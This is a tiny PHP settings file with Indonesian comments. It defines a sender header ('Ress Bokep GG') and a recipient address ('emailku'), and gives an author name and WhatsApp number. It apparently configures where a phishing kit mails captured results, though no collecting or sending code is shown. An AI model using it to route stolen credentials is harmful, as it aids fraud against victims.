<?php
//Ahmad Ganteng
//WA: 085606022801

$sender = 'From: Ress Bokep GG <ahmadgans@xx.com>';
$emailku = 'notnotahmad@gmail.com';

?>